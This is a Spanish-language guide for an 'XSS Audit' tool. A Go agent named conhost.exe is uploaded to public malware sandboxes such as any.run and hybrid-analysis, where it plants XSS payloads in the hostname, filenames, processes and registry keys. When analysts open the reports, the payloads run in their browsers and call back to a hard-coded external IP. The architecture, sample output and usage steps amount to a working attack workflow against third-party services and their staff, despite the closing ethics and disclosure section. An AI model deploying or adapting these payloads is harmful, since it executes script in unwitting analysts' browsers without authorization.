# 🎯 Guía de XSS Audit - Detección de Vulnerabilidades en Sandboxes

## 📋 Índice
1. [Introducción](#introducción)
2. [Arquitectura](#arquitectura)
3. [Configuración del Agente](#configuración-del-agente)
4. [Configuración del Servidor](#configuración-del-servidor)
5. [Uso](#uso)
6. [Interpretación de Resultados](#interpretación-de-resultados)
7. [Despliegue a Producción](#despliegue-a-producción)
8. [Consideraciones Éticas y Legales](#consideraciones-éticas-y-legales)

---

## Introducción

El módulo **XSS Audit** permite detectar vulnerabilidades de Cross-Site Scripting (XSS) en los reportes web generados por sandboxes de análisis de malware. 

### ¿Cómo funciona?

1. El agente inyecta payloads XSS en múltiples vectores (hostname, nombres de archivos, procesos, etc.)
2. El sandbox analiza el binario y genera un reporte HTML
3. Si el reporte es vulnerable, el XSS se ejecuta en el navegador del analista
4. El payload hace un callback a tu servidor
5. El dashboard muestra qué sandboxes son vulnerables

### Vectores de Inyección

- **Hostname**: Modifica el nombre del equipo con payloads XSS
- **Filenames**: Crea archivos con nombres que contienen XSS
- **Process Names**: Ejecuta procesos con nombres maliciosos
- **Registry Keys**: Crea claves de registro con XSS
- **Window Titles**: Crea ventanas con títulos XSS
- **Command Line**: Ejecuta comandos con argumentos XSS

---

## Arquitectura

```
┌─────────────────────────────────────────────────────────────┐
│                    AGENTE (conhost.exe)                     │
│                                                             │
│  1. Modo XSS Audit activado (XSS_AUDIT=true)              │
│  2. Genera payloads únicos con IDs                         │
│  3. Inyecta en múltiples vectores:                         │
│     - Hostname: PC-<img src=x onerror=fetch(...)>         │
│     - Archivos: malware<script>...</script>.txt            │
│     - Procesos: cmd.exe /c echo <svg onload=...>          │
│     - Registro: HKCU\Software\XSSTest<img...>             │
│  4. Envía ejecución + metadata de payloads al servidor    │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│                  SANDBOX (any.run, etc.)                    │
│                                                             │
│  1. Analiza el binario                                     │
│  2. Genera reporte HTML                                    │
│  3. Incluye datos recopilados (hostname, archivos, etc.)  │
│  4. Si vulnerable: XSS se ejecuta en el navegador         │
│  5. fetch('http://54.37.226.179/xss-callback?id=...')     │
└─────────────────────────────────────────────────────────────┘
                            │
                            ▼
┌─────────────────────────────────────────────────────────────┐
│              SERVIDOR DJANGO (Visualizer)                   │
│                                                             │
│  1. Recibe ejecución normal (/api/collect)                │
│     └─> Guarda payloads en estado "injected"              │
│                                                             │
│  2. Recibe callback XSS (/xss-callback?id=...)            │
│     └─> Registra hit                                       │
│     └─> Actualiza payload a "triggered"                   │
│     └─> Identifica sandbox (IP, user-agent)               │
│     └─> Retorna imagen 1x1 transparente                   │
│                                                             │
│  3. Dashboard (/xss-audit/dashboard/)                      │
│     └─> Muestra estadísticas                              │
│     └─> Lista hits recientes                              │
│     └─> Identifica sandboxes vulnerables                  │
└─────────────────────────────────────────────────────────────┘
```

---

## Configuración del Agente

### 1. Editar el archivo `.env`

```bash
cd artefacto
cp .env.example .env
nano .env
```

Configurar:

```env
# Activar modo XSS Audit
XSS_AUDIT=true

# Servidor de callback (debe ser accesible públicamente)
CALLBACK_SERVER=http://54.37.226.179

# URL del servidor para enviar datos
SERVER_URL=http://54.37.226.179/api/collect
```

### 2. Compilar el agente

```bash
go build -o conhost.exe
```

### 3. Ejecutar

```bash
./conhost.exe
```

Verás en la salida:

```
[🎯] ========== MODO XSS AUDIT ACTIVADO ==========
[🎯] Inyectando payloads XSS en múltiples vectores...
[XSS] Hostname modificado a: PC-<img src=x onerror="fetch('http://54.37.226.179/xss-callback?id=a3f2b8c1&v=hostname')">...
[XSS] Payload a3f2b8c1 inyectado en filename: C:\Users\...\malware<img src=x onerror=fetch('...')>.txt
[XSS] Payload b7k9m4n2 inyectado en proceso (PID: 1234)
[XSS] Payload c2m4p8q5 inyectado en registro
[🎯] Total de payloads inyectados: 10
[🎯] ===============================================
```

---

## Configuración del Servidor

### 1. Aplicar migraciones de base de datos

```bash
cd visualizer
python manage.py makemigrations xss_audit
python manage.py migrate
```

### 2. Verificar que la app está instalada

En `visualizer/visualizer/settings.py`:

```python
INSTALLED_APPS = [
    # ...
    'collector',
    'xss_audit',  # ← Debe estar aquí
]
```

### 3. Verificar URLs

En `visualizer/visualizer/urls.py`:

```python
urlpatterns = [
    path('admin/', admin.site.urls),
    path('', include('collector.urls')),
    path('', include('xss_audit.urls')),  # ← Debe estar aquí
]
```

### 4. Probar localmente

```bash
python manage.py runserver 0.0.0.0:8080
```

Acceder a: `http://localhost:8080/xss-audit/dashboard/`

---

## Uso

### Flujo Completo

1. **Compilar agente con XSS_AUDIT=true**
   ```bash
   cd artefacto
   # Editar .env: XSS_AUDIT=true
   go build -o conhost.exe
   ```

2. **Subir a sandbox**
   - Subir `conhost.exe` a any.run, hybrid-analysis, joe-sandbox, etc.
   - El sandbox ejecutará el binario

3. **Monitorear el dashboard**
   - Ir a `http://54.37.226.179/xss-audit/dashboard/`
   - Ver payloads inyectados (estado: "injected")
   - Esperar a que el sandbox genere el reporte

4. **Cuando se triggerea el XSS**
   - El payload cambia a estado "triggered"
   - Se registra un "hit" con:
     - IP del sandbox
     - User-Agent
     - Timestamp
     - Vector exitoso

5. **Identificar sandbox vulnerable**
   - El sistema intenta identificar el sandbox por patrones
   - Se muestra en la sección "Sandboxes Identificados"

---

## Interpretación de Resultados

### Dashboard Principal

```
📊 Estadísticas
├─ Payloads Inyectados: 1,234
├─ XSS Triggerados: 47 (3.8%)
├─ Total Hits: 52
└─ Sandboxes Vulnerables: 8

🔥 Últimos XSS Triggerados
├─ 2024-12-03 14:23 | Payload #a3f2 | hostname | any.run
├─ 2024-12-03 13:45 | Payload #b7k9 | filename | hybrid-analysis
└─ 2024-12-03 12:10 | Payload #c2m4 | process | joe-sandbox

📊 Vectores Más Exitosos
├─ hostname: 18 hits
├─ filename: 12 hits
├─ process: 9 hits
└─ registry: 8 hits

🎯 Sandboxes Identificados
├─ any.run: 15 hits (hostname, filename, process)
├─ hybrid-analysis: 12 hits (hostname, filename)
└─ joe-sandbox: 8 hits (hostname, registry)
```

### Interpretación

- **Tasa de éxito baja (< 5%)**: Normal, muchos sandboxes sanitizan correctamente
- **Tasa de éxito alta (> 20%)**: Sandbox muy vulnerable
- **Vector "hostname" exitoso**: El sandbox muestra el hostname sin sanitizar
- **Múltiples vectores exitosos**: Vulnerabilidad crítica

---

## Despliegue a Producción

### 1. Actualizar código en el servidor

```bash
# Conectar al servidor
ssh ubuntu@54.37.226.179

# Ir al directorio del proyecto
cd /opt/artefacto-visualizer

# Hacer backup
sudo cp -r . ../artefacto-visualizer-backup-$(date +%Y%m%d)

# Actualizar código (git pull o subir archivos)
git pull origin main
# O si subes manualmente:
# scp -r visualizer/* ubuntu@54.37.226.179:/opt/artefacto-visualizer/
```

### 2. Aplicar migraciones

```bash
# Activar entorno virtual
source /opt/venv/bin/activate

# Aplicar migraciones
cd /opt/artefacto-visualizer
python manage.py makemigrations xss_audit
python manage.py migrate

# Recolectar archivos estáticos
python manage.py collectstatic --noinput
```

### 3. Reiniciar servicios

```bash
# Reiniciar Gunicorn
sudo systemctl restart gunicorn

# Reiniciar Nginx
sudo systemctl restart nginx

# Verificar estado
sudo systemctl status gunicorn
sudo systemctl status nginx
```

### 4. Verificar logs

```bash
# Logs de Gunicorn
sudo journalctl -u gunicorn -n 50 -f

# Logs de Nginx
sudo tail -f /var/log/nginx/artefacto-visualizer-error.log

# Logs de Django (si hay)
sudo tail -f /var/log/artefacto-visualizer/error.log
```

### 5. Probar el endpoint

```bash
# Probar callback XSS
curl "http://54.37.226.179/xss-callback?id=test123&v=hostname"

# Debe retornar una imagen GIF 1x1
```

### 6. Verificar dashboard

Acceder a: `http://54.37.226.179/xss-audit/dashboard/`

---

## Consideraciones Éticas y Legales

### ⚠️ ADVERTENCIAS IMPORTANTES

1. **Solo para investigación de seguridad**
   - Este módulo es para investigación académica y mejora de la seguridad
   - NO usar con fines maliciosos

2. **Obtener permiso explícito**
   - Solo probar en sandboxes propios
   - O con permiso explícito del proveedor del sandbox

3. **Disclosure responsable**
   - Si encuentras vulnerabilidades, reportarlas al vendor
   - Dar tiempo razonable para parchear (90 días típicamente)
   - No publicar detalles hasta que esté parcheado

4. **No exfiltrar datos sensibles**
   - Los payloads solo hacen callbacks simples
   - No intentar robar cookies, tokens, o datos del analista

5. **Documentar todo**
   - Mantener registros de qué sandboxes probaste
   - Documentar hallazgos
   - Preparar reportes profesionales

### Ejemplo de Disclosure Responsable

```
Para: security@sandbox-vendor.com
Asunto: Vulnerabilidad XSS en reportes de análisis

Estimado equipo de seguridad,

He identificado una vulnerabilidad de Cross-Site Scripting (XSS) en los 
reportes HTML generados por su sandbox. Los detalles técnicos están 
adjuntos.

Impacto: Un atacante podría inyectar código JavaScript que se ejecutaría
en el navegador de los analistas que revisen el reporte.

Solicito:
- Confirmación de recepción
- Timeline estimado para el parche
- Permiso para publicar después del parche

Saludos,
[Tu nombre]
[Tu afiliación]
```

---

## Troubleshooting

### No se reciben callbacks

1. **Verificar que el servidor es accesible**
   ```bash
   curl http://54.37.226.179/xss-callback?id=test
   ```

2. **Verificar firewall**
   ```bash
   sudo ufw status
   # Debe permitir puerto 80
   ```

3. **Verificar logs de Nginx**
   ```bash
   sudo tail -f /var/log/nginx/artefacto-visualizer-access.log
   ```

### Payloads no se guardan

1. **Verificar migraciones**
   ```bash
   python manage.py showmigrations xss_audit
   ```

2. **Verificar logs de Django**
   ```bash
   sudo journalctl -u gunicorn -n 100 | grep XSS
   ```

### Dashboard no carga

1. **Verificar que la app está instalada**
   ```python
   # En settings.py
   INSTALLED_APPS = [..., 'xss_audit']
   ```

2. **Verificar URLs**
   ```bash
   python manage.py show_urls | grep xss
   ```

---

## Contribuir

Si encuentras bugs o quieres mejorar el módulo:

1. Crear issue en GitHub
2. Fork del repositorio
3. Crear branch: `git checkout -b feature/mejora-xss`
4. Commit: `git commit -am 'Añadir nueva funcionalidad'`
5. Push: `git push origin feature/mejora-xss`
6. Crear Pull Request

---

## Referencias

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [Responsible Disclosure Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Vulnerability_Disclosure_Cheat_Sheet.html)

---

**Desarrollado con fines de investigación de seguridad. Usar responsablemente.**
